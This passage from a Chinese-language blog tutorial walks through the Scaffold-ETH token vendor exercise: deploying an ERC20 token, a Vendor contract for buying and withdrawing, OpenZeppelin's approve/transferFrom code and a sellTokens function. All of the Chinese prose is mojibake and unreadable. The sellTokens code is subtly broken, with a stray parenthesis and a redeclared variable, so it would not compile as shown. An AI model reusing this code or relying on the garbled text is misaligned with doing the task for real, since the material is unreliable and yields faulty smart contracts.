class="line">...</span><br></pre></td></tr></table></figure><p>ç„¶åæˆ‘ä»¬è¿è¡Œ <code>yarn deploy --reset</code> éƒ¨ç½²åˆçº¦ã€‚</p><h3><span id="yan-zheng">éªŒè¯</span></h3><ol><li><p>ä½¿ç”¨ Debug é¡µé¢åŠŸèƒ½è¿›è¡Œæ£€æŸ¥ï¼ŒæŸ¥çœ‹ç”¨æˆ·è´¦æˆ·ä¸­çš„ä»£å¸ä½™é¢ï¼Œå¯ä»¥çœ‹åˆ°è´¦æˆ·ä¸­æœ‰ 1000 ä¸ªä»£å¸ï¼›</p><p><img src="https://user-images.githubusercontent.com/3297411/155913531-951312e7-ea2e-497e-a323-722ecd295ca4.png" alt="balance"></p></li><li><p>ä½¿ç”¨ <code>transfer()</code> å°†ä»£å¸è½¬ç»™å¦ä¸€ä¸ªè´¦æˆ·ï¼›</p><p>åœ¨ Debug ä¸­ï¼Œä½¿ç”¨ <code>transfer</code> åŠŸèƒ½ï¼Œè¾“å…¥ç›®æ ‡é’±åŒ…åœ°å€ <code>0xc12ae5Ba30Da6eB11978939379D383beb5Df9b33</code>ï¼Œä»¥åŠå‘é€çš„æ•°é‡ <code>1000000000000000000000</code>ï¼ˆ1000*1E18ï¼Œ1åè¾¹æœ‰21ä¸ª0ï¼‰ï¼Œç‚¹å‡»å‘é€ã€‚ç­‰äº¤æ˜“å®Œæˆä¹‹åï¼Œå¯ä»¥åˆ†åˆ«æŸ¥çœ‹åŸæ¥è´¦æˆ·å’Œç›®æ ‡è´¦æˆ·çš„ä»£å¸æ•°é‡ï¼Œå¯ä»¥çœ‹åˆ°åŸæ¥çš„å˜æˆäº† 0ï¼Œç›®æ ‡è´¦æˆ·æ˜¯ 1000ã€‚</p><p><img src="https://user-images.githubusercontent.com/3297411/155913544-122451a0-8533-46cf-9aa3-7f90e8fa59ab.png" alt="transfer"></p></li></ol><p>æ³¨æ„ï¼š</p><ul><li>å¦‚æœå‘é€æ—¶å‡ºç°ä½™é¢ä¸è¶³çš„æç¤ºï¼Œå¯ä»¥ä½¿ç”¨é¡µé¢å·¦ä¸‹è§’çš„ Faucet ä¸ºè´¦æˆ·å……å€¼ã€‚</li><li>éªŒè¯å®Œæˆä¹‹åï¼Œéœ€è¦å°† <code>00_deploy_your_token.ts</code> ä¸­çš„ transfer ä»£ç æ³¨é‡Šäº†ï¼Œä¸ç„¶ä¼šå½±å“ä¹‹åçš„æ­¥éª¤ã€‚</li></ul><h2><span id="san-cheng-xiao-shang-he-yue-gou-mai">ä¸‰ã€æ‰¿é”€å•†åˆçº¦ â€” è´­ä¹°</span></h2><p>æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬åˆ›å»ºä¸€ä¸ªæ‰¿é”€å•†åˆçº¦ï¼Œè¿™ä¸ªåˆçº¦å…è®¸ç”¨æˆ·é€šè¿‡ä»¥å¤ªè´­ä¹°ä»£å¸ã€‚</p><p>ä¸ºäº†å®Œæˆè¿™ä¸ªåŠŸèƒ½ï¼Œæˆ‘ä»¬éœ€è¦ï¼š</p><ol><li>è®¾ç½®å…‘æ¢æ¯”ä¾‹ï¼Œæ•™ç¨‹ä¸­ä¸º <code>tokensPerEth=100</code> ï¼Œä¹Ÿå°±æ˜¯ 1ä¸ªä»¥å¤ªå¯ä»¥å…‘æ¢ 100 GLDï¼›</li><li>å®ç° <code>buyTokens</code> å‡½æ•°ï¼Œè¿™ä¸ªå‡½æ•°å¿…é¡»æ˜¯ <code>payable</code>ï¼Œå¯ä»¥æ¥å—å‘é€çš„ä»¥å¤ªï¼Œè®¡ç®—å¯¹åº”çš„ <code>GLD</code> æ•°é‡ï¼Œç„¶åä½¿ç”¨ <code>transfer</code> å°†ç›¸åº”çš„ <code>GLD</code> ä»£å¸å‘é€ç»™è´­ä¹°è€… <code>msg.sender</code>ï¼›</li><li>è§¦å‘ä¸€ä¸ª <code>BuyTokens</code> äº‹ä»¶ï¼Œè®°å½•è´­ä¹°è€…ï¼Œä½¿ç”¨çš„ ETH æ•°é‡ä»¥åŠè´­ä¹°çš„ GLD æ•°é‡ï¼›</li><li>å®ç°ç¬¬äºŒä¸ªå‡½æ•° <code>withdraw</code>ï¼Œç”¨æ¥å°†åˆçº¦ä¸­çš„ ETH å…¨éƒ¨æå–åˆ°åˆçº¦çš„æ‰€æœ‰è€…ï¼ˆownerï¼‰åœ°å€ã€‚æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ä¸¤ç§æ–¹å¼è®¾ç½®åˆçº¦çš„æ‰€æœ‰è€…ï¼š<ol><li>éƒ¨ç½²æ—¶ï¼Œä½¿ç”¨æˆ‘ä»¬èƒ½æ§åˆ¶çš„é’±åŒ…åœ°å€è¿›è¡Œéƒ¨ç½²ï¼Œå¹¶è®¾ç½®æ‰€æœ‰è€…ï¼›</li><li>ä½¿ç”¨ä»»æ„åœ°å€éƒ¨ç½²ï¼Œéƒ¨ç½²ç»“æŸä¹‹åè¿›è¡Œåˆçº¦æ‰€æœ‰æƒè½¬ç§»ï¼›</li></ol></li></ol><p>åœ¨è¿™ä¸ªæ•™ç¨‹ä¸­ï¼Œæˆ‘ä»¬ä½¿ç”¨ç¬¬äºŒä¸ªæ–¹å¼ï¼Œè¿™æ ·æˆ‘ä»¬å¯ä»¥ä¸ç”¨å°†æˆ‘ä»¬æ§åˆ¶çš„åœ°å€çš„ç§é’¥æ·»åŠ åˆ°é¡¹ç›®é…ç½®ä¸­ï¼Œé™ä½æš´éœ²ã€‚</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity &gt;=0.8.0 &lt;0.9.0;</span><br><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line"></span><br><span class="line">import &quot;@openzeppelin/contracts/access/Ownable.sol&quot;;</span><br><span class="line">import &#x27;./YourToken.sol&#x27;;</span><br><span class="line"></span><br><span class="line">contract Vendor is Ownable &#123;</span><br><span class="line">  YourToken yourToken;</span><br><span class="line">  uint256 public tokensPerEth = 100;</span><br><span class="line"></span><br><span class="line">  // è´­ä¹°ä»£å¸äº‹ä»¶</span><br><span class="line">  event BuyTokens(address buyer, uint256 amountOfEth, uint256 amountOfTokens);</span><br><span class="line"></span><br><span class="line">  constructor(address tokenAddress) public &#123;</span><br><span class="line">    yourToken = YourToken(tokenAddress);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // å…è®¸ç”¨æˆ·ä½¿ç”¨ EHT è´­ä¹°ä»£å¸</span><br><span class="line">  function buyTokens() payable public &#123;</span><br><span class="line">    // æ£€æŸ¥æ˜¯å¦æœ‰è¶³å¤Ÿçš„ ETH</span><br><span class="line">    require(msg.value &gt; 0, &quot;Not enought ether&quot;);</span><br><span class="line"></span><br><span class="line">    uint256 amountOfTokens = msg.value * tokensPerEth;</span><br><span class="line"></span><br><span class="line">    // æ£€æŸ¥æ‰¿é”€å•†æ˜¯å¦æœ‰è¶³å¤Ÿçš„ä»£å¸</span><br><span class="line">    uint256 tokenBalance = yourToken.balanceOf(address(this));</span><br><span class="line">    require(tokenBalance &gt; amountOfTokens, &quot;Not enought tokens&quot;);</span><br><span class="line">    </span><br><span class="line">    // å‘é€ä»£å¸</span><br><span class="line">    bool sent =  yourToken.transfer(msg.sender, amountOfTokens);</span><br><span class="line">    require(sent, &quot;Failed to transfer token to the buyer&quot;);</span><br><span class="line"></span><br><span class="line">    emit BuyTokens(msg.sender, msg.value, amountOfTokens);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // å…è®¸æ‰€æœ‰è€…å–å‡ºæ‰€æœ‰ä»£å¸</span><br><span class="line">  function withdraw() public onlyOwner &#123;</span><br><span class="line"></span><br><span class="line">    uint256 balance = address(this).balance;</span><br><span class="line">    require(balance &gt; 0, &quot;No ether to withdraw&quot;);</span><br><span class="line">    </span><br><span class="line">    // å‘é€ä»£å¸ç»™æ‰€æœ‰è€…</span><br><span class="line">    (bool sent, ) = msg.sender.call&#123;value: balance&#125;(&quot;&quot;);</span><br><span class="line">    require(sent, &quot;Failed to withdraw balance&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">  // ToDo: create a sellTokens() function:</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å…¶ä¸­ï¼Œ <code>Ownable</code> å¯ä»¥è¿›è¡Œæƒé™æ§åˆ¶ï¼Œåˆçº¦æä¾›çš„<code>onlyOwner</code>ä¿®æ”¹å™¨å¯ä»¥ç”¨æ¥é™åˆ¶æŸäº›ç‰¹å®šåˆçº¦å‡½æ•°çš„è®¿é—®æƒé™ã€‚åœ¨è¿™é‡Œï¼Œæˆ‘ä»¬çš„ <code>withdraw</code> å‡½æ•°å¿…éœ€é™åˆ¶åˆçº¦çš„æ‰€æœ‰è¿™æ‰èƒ½æå–æ‰€æœ‰çš„èµ„é‡‘ã€‚åŒæ—¶ï¼Œè¿™ä¸ªåˆçº¦æä¾›äº† <code>transferOwnership</code> å‡½æ•°ï¼Œå¯ä»¥ç”¨æ¥è½¬ç§»åˆçº¦çš„æ‰€æœ‰è€…ï¼Œè¿™ä¸ªå°†åœ¨æˆ‘ä»¬çš„è„šæœ¬éƒ¨åˆ†ä¸­ä½¿ç”¨ã€‚</p><p>å¯¹äºéƒ¨ç½²è„šæœ¬ï¼Œæˆ‘ä»¬éœ€è¦å®Œæˆä»¥ä¸‹åŠŸèƒ½ï¼š</p><ol><li>åœ¨éƒ¨ç½²çš„æ—¶å€™å°†æ‰€æœ‰çš„ä»£å¸å‘é€åˆ°æ‰¿é”€å•†çš„åˆçº¦åœ°å€ <code>vendor.address</code> ï¼Œè€Œä¸æ˜¯æˆ‘ä»¬ä¹‹å‰çš„åœ°å€ï¼›</li><li>ä¸ºäº†èƒ½å°†æ‰¿é”€å•†åˆçº¦ä¸­çš„æ‰€æœ‰ ETH æå–å‡ºæ¥ï¼Œéœ€è¦å°†åˆçº¦çš„æ‰€æœ‰æƒ <code>ownership</code> è½¬ç§»åˆ°æˆ‘ä»¬èƒ½æ§åˆ¶çš„åœ°å€ï¼Œæ¯”å¦‚æˆ‘ä»¬åœ¨å‰ç«¯ä½¿ç”¨çš„åœ°å€ã€‚</li></ol><p>è„šæœ¬ä½ç½®ï¼š <code>packages/hardhat-ts/deploy/01_deploy_vendor.ts</code></p><figure class="highlight tsx"><table><tr><td class="code"><pre><span class="line"> <span class="comment">// You might need the previously deployed yourToken:</span></span><br><span class="line"> <span class="keyword">const</span> yourToken = <span class="keyword">await</span> ethers.<span class="title function_">getContract</span>(<span class="string">&#x27;YourToken&#x27;</span>, deployer);</span><br><span class="line"></span><br><span class="line"> <span class="comment">// éƒ¨ç½²æ‰¿é”€å•†åˆçº¦</span></span><br><span class="line"> <span class="keyword">await</span> <span class="title function_">deploy</span>(<span class="string">&#x27;Vendor&#x27;</span>, &#123;</span><br><span class="line">   <span class="comment">// Learn more about args here: https://www.npmjs.com/package/hardhat-deploy#deploymentsdeploy</span></span><br><span class="line">   <span class="attr">from</span>: deployer,</span><br><span class="line">   <span class="attr">args</span>: [yourToken.<span class="property">address</span>],</span><br><span class="line">   <span class="attr">log</span>: <span class="literal">true</span>,</span><br><span class="line"> &#125;);</span><br><span class="line"><span class="comment">// è·å–éƒ¨ç½²çš„åˆçº¦</span></span><br><span class="line"> <span class="keyword">const</span> vendor = <span class="keyword">await</span> ethers.<span class="title function_">getContract</span>(<span class="string">&#x27;Vendor&#x27;</span>, deployer);</span><br><span class="line"></span><br><span class="line"> <span class="comment">// å‘é€ 1000 ä¸ªä»£å¸ç»™æ‰¿é”€å•†</span></span><br><span class="line"> <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;\n ğŸµ  Sending all 1000 tokens to the vendor...\n&#x27;</span>);</span><br><span class="line"> <span class="keyword">await</span> yourToken.<span class="title function_">transfer</span>(vendor.<span class="property">address</span>, ethers.<span class="property">utils</span>.<span class="title function_">parseEther</span>(<span class="string">&#x27;1000&#x27;</span>));</span><br><span class="line"></span><br><span class="line"> <span class="comment">// è½¬ç§»æ‰€æœ‰æƒ</span></span><br><span class="line"> <span class="keyword">await</span> vendor.<span class="title function_">transferOwnership</span>(<span class="string">&#x27;0x169841AA3024cfa570024Eb7Dd6Bf5f774092088&#x27;</span>);</span><br></pre></td></tr></table></figure><h3><span id="bu-shu-he-yue">éƒ¨ç½²åˆçº¦</span></h3><p>å®Œæˆä¸Šè¿°ä»£ç ä¹‹åï¼Œæˆ‘ä»¬é‡æ–°éƒ¨ç½²æˆ‘ä»¬çš„åˆçº¦ï¼š</p><figure class="highlight tsx"><table><tr><td class="code"><pre><span class="line">yarn deploy --reset</span><br></pre></td></tr></table></figure><p>å¯¹åº”çš„è¾“å‡ºç»“æœä¸ºï¼š</p><figure class="highlight tsx"><table><tr><td class="code"><pre><span class="line">$ yarn deploy --reset</span><br><span class="line"></span><br><span class="line"><span class="title class_">Compiling</span> <span class="number">7</span> files <span class="keyword">with</span> <span class="number">0.8</span><span class="number">.6</span></span><br><span class="line"><span class="title class_">Generating</span> typings <span class="attr">for</span>: <span class="number">7</span> artifacts <span class="keyword">in</span> <span class="attr">dir</span>: ../vite-app-ts/src/generated/contract-types <span class="keyword">for</span> <span class="attr">target</span>: ethers-v5</span><br><span class="line"><span class="title class_">Successfully</span> generated <span class="number">15</span> typings!</span><br><span class="line"><span class="title class_">Compilation</span> finished successfully</span><br><span class="line">deploying <span class="string">&quot;YourToken&quot;</span> (<span class="attr">tx</span>: <span class="number">0x758e492bc71e9de37cf109aa6aa966fc6c042d086babce32ddd76af02ec22acb</span>)...: deployed at <span class="number">0x0DCd1Bf9A1b36cE34237eEaFef220932846BCD82</span> <span class="keyword">with</span> <span class="number">639137</span> gas</span><br><span class="line">deploying <span class="string">&quot;Vendor&quot;</span> (<span class="attr">tx</span>: <span class="number">0x7b0402937081b72f59abb9994e3773b0283116e1106665766af31bf246b466cc</span>)...: deployed at <span class="number">0x9A676e781A523b5d0C0e43731313A708CB607508</span> <span class="keyword">with</span> <span class="number">482680</span> gas</span><br><span class="line"></span><br><span class="line"> ğŸµ  <span class="title class_">Sending</span> all <span class="number">1000</span> tokens to the vendor...</span><br></pre></td></tr></table></figure><p>å¯ä»¥ä»å‘½ä»¤è¡Œè¾“å‡ºä¸­çœ‹åˆ°åˆçº¦éƒ¨ç½²çš„åœ°å€ä¸ºï¼š</p><ul><li>æ‰¿é”€å•†åˆçº¦åœ°å€ï¼š <code>0x9A676e781A523b5d0C0e43731313A708CB607508</code></li><li>ä»£å¸åœ°å€ï¼š <code>0x0DCd1Bf9A1b36cE34237eEaFef220932846BCD82</code></li></ul><h3><span id="yan-zheng">éªŒè¯</span></h3><p>æˆ‘ä»¬é€šè¿‡ä»¥ä¸‹æ­¥éª¤è¿›è¡ŒéªŒè¯ï¼š</p><ol><li><p>é€šè¿‡ Debug é¡µé¢æŸ¥çœ‹æ‰¿é”€å•† ï¼ˆVendorï¼‰åˆçº¦åœ°å€åˆå§‹æ—¶æ˜¯å¦æœ‰ 1000 ä¸ªä»£å¸ï¼›</p></li><li><p>ä½¿ç”¨ 0.1 ETH è´­ä¹° 10 ä¸ª GLDï¼šæˆ‘ä»¬ä½¿ç”¨ Buy Tokens åŠŸèƒ½è´­ä¹° 10 ä¸ªä»£å¸ï¼Œå¯ä»¥çœ‹åˆ°æ­¤æ—¶çš„ä»·æ ¼çº¦ä¸º 0.1 ETHï¼ˆETH ä»·æ ¼ä¸º 2766.7 ç¾å…ƒï¼‰ã€‚</p><p><img src="https://user-images.githubusercontent.com/3297411/155913532-492474ae-5a67-4fcc-8c37-eb768c8ae18e.png" alt="buyTokens"></p></li><li><p>å°†è´­ä¹°çš„ä»£å¸å‘é€ç»™å¦ä¸€ä¸ªè´¦æˆ·ï¼šåŒæ ·ä½¿ç”¨é¡µé¢ Transfer Tokens åŠŸèƒ½å®Œæˆï¼›</p><p><img src="https://user-images.githubusercontent.com/3297411/155913543-fe8f7c93-aa6b-4333-8c3f-87dd30ced5d6.png" alt="tokenBalance"></p></li><li><p>ä½¿ç”¨æ‰€æœ‰è€…è´¦æˆ·ï¼ŒæŸ¥çœ‹æ˜¯å¦èƒ½å…¨éƒ¨å–å‡ºåˆçº¦ä¸­çš„ ETHï¼šåœ¨ Debug é¡µé¢ï¼Œæˆ‘ä»¬ä½¿ç”¨ <code>withdraw</code> åŠŸèƒ½ï¼Œå°è¯•å°†æ‰¿é”€å•†åˆçº¦ä¸­çš„ ETH å…¨éƒ¨å–å‡ºï¼Œå¯ä»¥çœ‹åˆ°ï¼Œå½“äº¤æ˜“å®Œæˆä»¥åï¼Œåˆçº¦çš„ä½™é¢å˜ä¸ºäº†0ï¼š</p></li></ol><pre><code>![vendorBalanceBefore](https://user-images.githubusercontent.com/3297411/155913554-5f0e78f5-0836-4d53-b0b8-adb44a37413c.png)å˜ä¸ºï¼š![vendorBalanceAfter](https://user-images.githubusercontent.com/3297411/155913548-289343ef-d51a-4fbb-8134-071918589636.png)</code></pre><h2><span id="si-cheng-xiao-shang-he-yue-hui-gou">å››ã€æ‰¿é”€å•†åˆçº¦ â€” å›è´­</span></h2><p>æ¥ä¸‹æ¥æˆ‘ä»¬æ·»åŠ æ‰¿é”€å•†åˆçº¦çš„å›è´­ä»£å¸åŠŸèƒ½ï¼Œä¹Ÿå°±æ˜¯å…è®¸ç”¨æˆ·é€šè¿‡å‘é€ä»£å¸ç»™æ‰¿é”€å•†åˆçº¦ï¼Œæ‰¿é”€å•†åˆçº¦å°†å¯¹åº”çš„ETHå‘ç»™ç”¨æˆ·è´¦æˆ·ã€‚ä½†æ˜¯åœ¨ä»¥å¤ªåŠä¸­ï¼Œåˆçº¦åªèƒ½é€šè¿‡ payable æ¥å— ETHï¼Œæ— æ³•æ¥å—ç›´æ¥å‘é€ä»£å¸ï¼Œå¦‚æœç›´æ¥å‘åˆçº¦å‘é€ä»£å¸ï¼Œä»£å¸å°†ä¼šæ°¸ä¹…æ¶ˆå¤±ã€‚æ‰€ä»¥åœ¨ ERC20 æ ‡å‡†ä¸­ï¼Œæˆ‘ä»¬éœ€è¦ä½¿ç”¨ <code>approve</code> å’Œ <code>tranferFrom</code> è€…ä¸¤ä¸ªå‡½æ•°æ¥å®Œæˆè¿™ä¸ªè¿‡ç¨‹ã€‚</p><figure class="highlight tsx"><table><tr><td class="code"><pre><span class="line"><span class="title function_">approve</span>(address spender, uint256 amount) -&gt; bool</span><br><span class="line"><span class="title function_">transferFrom</span>(address <span class="keyword">from</span>, address to, uint256 amount) -&gt; bool</span><br></pre></td></tr></table></figure><p>é¦–å…ˆï¼Œç”¨æˆ·é€šè¿‡è°ƒç”¨ <code>approve</code> å‡½æ•°æˆæƒæ‰¿é”€å•†åˆçº¦ï¼ˆ <code>spender</code> ï¼‰å¤„ç† <code>amount</code> æ•°é‡çš„ä»£å¸ï¼Œç„¶åï¼Œè°ƒç”¨ <code>transferFrom</code> å‡½æ•°å°†ä»£å¸ä»ç”¨æˆ·è´¦æˆ·ï¼ˆ <code>from</code> ï¼‰è½¬ç§» <code>amount</code> æ•°é‡çš„ä»£å¸ç»™æ‰¿é”€å•†åˆçº¦ï¼ˆ <code>to</code> ï¼‰ã€‚è¿™å…¶ä¸­çš„éš¾ç‚¹åœ¨äº <code>approve</code> å’Œ <code>transferFrom</code> å‡½æ•°ã€‚æˆ‘ä»¬æ¥çœ‹ä¸€ä¸‹è¿™ä¸¤ä¸ªå‡½æ•°åœ¨ OpenZeppelin ä¸­å…·ä½“å®ç°ï¼Œé¦–å…ˆæ˜¯ <code>approve</code>ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">  mapping(address =&gt; mapping(address =&gt; uint256)) private _allowances;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line">   * @dev See &#123;IERC20-approve&#125;.</span><br><span class="line">   *</span><br><span class="line">   * NOTE: If `amount` is the maximum `uint256`, the allowance is not updated on</span><br><span class="line">   * `transferFrom`. This is semantically equivalent to an infinite approval.</span><br><span class="line">   *</span><br><span class="line">   * Requirements:</span><br><span class="line">   *</span><br><span class="line">   * - `spender` cannot be the zero address.</span><br><span class="line">   */</span><br><span class="line">  function approve(address spender, uint256 amount) public virtual override returns (bool) &#123;</span><br><span class="line">      address owner = _msgSender();</span><br><span class="line">      _approve(owner, spender, amount);</span><br><span class="line">      return true;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  /**</span><br><span class="line">   * @dev Sets `amount` as the allowance of `spender` over the `owner` s tokens.</span><br><span class="line">   *</span><br><span class="line">   * This internal function is equivalent to `approve`, and can be used to</span><br><span class="line">   * e.g. set automatic allowances for certain subsystems, etc.</span><br><span class="line">   *</span><br><span class="line">   * Emits an &#123;Approval&#125; event.</span><br><span class="line">   *</span><br><span class="line">   * Requirements:</span><br><span class="line">   *</span><br><span class="line">   * - `owner` cannot be the zero address.</span><br><span class="line">   * - `spender` cannot be the zero address.</span><br><span class="line">   */</span><br><span class="line">  function _approve(</span><br><span class="line">      address owner,</span><br><span class="line">      address spender,</span><br><span class="line">      uint256 amount</span><br><span class="line">  ) internal virtual &#123;</span><br><span class="line">      require(owner != address(0), &quot;ERC20: approve from the zero address&quot;);</span><br><span class="line">      require(spender != address(0), &quot;ERC20: approve to the zero address&quot;);</span><br><span class="line"></span><br><span class="line">      _allowances[owner][spender] = amount;</span><br><span class="line">      emit Approval(owner, spender, amount);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>ä»ä¸Šé¢å¯ä»¥çœ‹å‡ºï¼Œ <code>approve</code> å‡½æ•°è°ƒç”¨äº† <code>_approve</code>ï¼Œ <code>_approve</code> ä¸­ç”¨ <code>_allowances</code> è¿™ä¸ªå“ˆå¸Œè®°å½•äº† <code>owner</code> å’Œ <code>spender</code> ä¹‹é—´çš„æˆæƒæ•°é‡ <code>amount</code>ã€‚å› æ­¤å¯ä»¥æ¨æ–­ï¼Œ <code>transferFrom</code> å‡½æ•°ä»¥åŠå…¶ä»–éœ€è¦æˆæƒæƒ…å†µçš„å‡½æ•°éƒ½ä½¿ç”¨äº† <code>_allowances</code> è¿™ä¸ªå˜é‡ï¼Œæ¯”å¦‚ <code>allowance</code> å‡½æ•°ã€‚</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/**</span><br><span class="line"> * @dev See &#123;IERC20-allowance&#125;.</span><br><span class="line"> */</span><br><span class="line">function allowance(address owner, address spender) public view virtual override returns (uint256) &#123;</span><br><span class="line">    return _allowances[owner][spender];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * @dev Updates `owner` s allowance for `spender` based on spent `amount`.</span><br><span class="line"> *</span><br><span class="line"> * Does not update the allowance amount in case of infinite allowance.</span><br><span class="line"> * Revert if not enough allowance is available.</span><br><span class="line"> *</span><br><span class="line"> * Might emit an &#123;Approval&#125; event.</span><br><span class="line"> */</span><br><span class="line">function _spendAllowance(</span><br><span class="line">    address owner,</span><br><span class="line">    address spender,</span><br><span class="line">    uint256 amount</span><br><span class="line">) internal virtual &#123;</span><br><span class="line">    uint256 currentAllowance = allowance(owner, spender);</span><br><span class="line">    if (currentAllowance != type(uint256).max) &#123;</span><br><span class="line">        require(currentAllowance &gt;= amount, &quot;ERC20: insufficient allowance&quot;);</span><br><span class="line">        unchecked &#123;</span><br><span class="line">            _approve(owner, spender, currentAllowance - amount);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * @dev Moves `amount` of tokens from `sender` to `recipient`.</span><br><span class="line"> *</span><br><span class="line"> * This internal function is equivalent to &#123;transfer&#125;, and can be used to</span><br><span class="line"> * e.g. implement automatic token fees, slashing mechanisms, etc.</span><br><span class="line"> *</span><br><span class="line"> * Emits a &#123;Transfer&#125; event.</span><br><span class="line"> *</span><br><span class="line"> * Requirements:</span><br><span class="line"> *</span><br><span class="line"> * - `from` cannot be the zero address.</span><br><span class="line"> * - `to` cannot be the zero address.</span><br><span class="line"> * - `from` must have a balance of at least `amount`.</span><br><span class="line"> */</span><br><span class="line">function _transfer(</span><br><span class="line">    address from,</span><br><span class="line">    address to,</span><br><span class="line">    uint256 amount</span><br><span class="line">) internal virtual &#123;</span><br><span class="line">    require(from != address(0), &quot;ERC20: transfer from the zero address&quot;);</span><br><span class="line">    require(to != address(0), &quot;ERC20: transfer to the zero address&quot;);</span><br><span class="line"></span><br><span class="line">    _beforeTokenTransfer(from, to, amount);</span><br><span class="line"></span><br><span class="line">    uint256 fromBalance = _balances[from];</span><br><span class="line">    require(fromBalance &gt;= amount, &quot;ERC20: transfer amount exceeds balance&quot;);</span><br><span class="line">    unchecked &#123;</span><br><span class="line">        _balances[from] = fromBalance - amount;</span><br><span class="line">    &#125;</span><br><span class="line">    _balances[to] += amount;</span><br><span class="line"></span><br><span class="line">    emit Transfer(from, to, amount);</span><br><span class="line"></span><br><span class="line">    _afterTokenTransfer(from, to, amount);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * @dev See &#123;IERC20-transferFrom&#125;.</span><br><span class="line"> *</span><br><span class="line"> * Emits an &#123;Approval&#125; event indicating the updated allowance. This is not</span><br><span class="line"> * required by the EIP. See the note at the beginning of &#123;ERC20&#125;.</span><br><span class="line"> *</span><br><span class="line"> * NOTE: Does not update the allowance if the current allowance</span><br><span class="line"> * is the maximum `uint256`.</span><br><span class="line"> *</span><br><span class="line"> * Requirements:</span><br><span class="line"> *</span><br><span class="line"> * - `from` and `to` cannot be the zero address.</span><br><span class="line"> * - `from` must have a balance of at least `amount`.</span><br><span class="line"> * - the caller must have allowance for ``from``&#x27;s tokens of at least</span><br><span class="line"> * `amount`.</span><br><span class="line"> */</span><br><span class="line">function transferFrom(</span><br><span class="line">    address from,</span><br><span class="line">    address to,</span><br><span class="line">    uint256 amount</span><br><span class="line">) public virtual override returns (bool) &#123;</span><br><span class="line">    address spender = _msgSender();</span><br><span class="line">    _spendAllowance(from, spender, amount);</span><br><span class="line">    _transfer(from, to, amount);</span><br><span class="line">    return true;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨ <code>transferFrom</code> å‡½æ•°ä¸­ï¼Œå…ˆä½¿ç”¨ <code>_spendAllowance</code> è¿›è¡Œæˆæƒæ•°é‡æ£€æŸ¥å¹¶æ›´æ–°æˆæƒæ•°é‡ï¼Œç„¶åå†ä½¿ç”¨ <code>_transfer</code> è¿›è¡Œä»£å¸åˆ’è½¬ï¼Œè€Œ <code>_spendAllowance</code> ä¸­æ­£æ˜¯è°ƒç”¨äº† <code>allowance</code> è¿™ä¸ªå‡½æ•°ã€‚</p><h3><span id="he-yue-shi-xian">åˆçº¦å®ç°</span></h3><p>åˆçº¦çš„å‡½æ•°å®ç°å¦‚ä¸‹ï¼š</p><figure class="highlight tsx"><table><tr><td class="code"><pre><span class="line">...</span><br><span class="line">  event <span class="title class_">SellTokens</span>(address seller, uint256 amountOfTokens, uint256 amountOfETH);</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">  <span class="comment">// å…è®¸ç”¨æˆ·ä½¿ç”¨ä»£å¸æ¢å› ETH</span></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">sellTokens</span>(<span class="params">uint256 amountToSell</span>) <span class="keyword">public</span> &#123;</span><br><span class="line">    <span class="comment">// ä»·å·®æ˜¯å¦åˆç†</span></span><br><span class="line">    <span class="built_in">require</span>(amountToSell &gt; <span class="number">0</span>, <span class="string">&quot;Amount to sell must be greater than 0&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// æ£€æŸ¥ç”¨æˆ·æ˜¯å¦æœ‰è¶³å¤Ÿçš„ä»£å¸</span></span><br><span class="line">    uint256 userBalance = yourToken.<span class="title function_">balanceOf</span>(msg.<span class="property">sender</span>));</span><br><span class="line">    <span class="built_in">require</span>(userBalance &gt;= amountToSell, <span class="string">&quot;Not enought tokens&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// æ£€æŸ¥æ‰¿é”€å•†æ˜¯å¦æœ‰è¶³å¤Ÿçš„ ETH</span></span><br><span class="line">    uint256 amountOfEthNeeded = amountToSell / tokensPerEth;</span><br><span class="line">    uint256 venderBalance = <span class="title function_">address</span>(<span class="variable language_">this</span>).<span class="property">balance</span>;</span><br><span class="line">    <span class="built_in">require</span>(amountOfEthNeeded &lt;= venderBalance, <span class="string">&quot;Not enought ether&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ç”¨æˆ·å‘é€ä»£å¸ç»™æ‰¿é”€å•†</span></span><br><span class="line">    bool sent =  yourToken.<span class="title function_">transferFrom</span>(msg.<span class="property">sender</span>, <span class="title function_">address</span>(<span class="variable language_">this</span>), amountToSell);</span><br><span class="line">    <span class="built_in">require</span>(sent, <span class="string">&quot;Failed to transfer tokens from seller to vender&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// æ‰¿é”€å•†å‘é€ ETH ç»™ç”¨æˆ·</span></span><br><span class="line">    (bool sent, ) = msg.<span class="property">sender</span>.<span class="property">call</span>&#123;<span class="attr">value</span>: amountOfEthNeeded&#125;(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    <span class="built_in">require</span>(sent, <span class="string">&quot;Failed to send ether from vender to seller&quot;</span>);</span><br><span class="line"></span><br><span class="line">    emit <span class="title class_">SellTokens</span>(msg.<span class="property">sender</span>, amountToSell, amountOfEthNeeded);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3><span 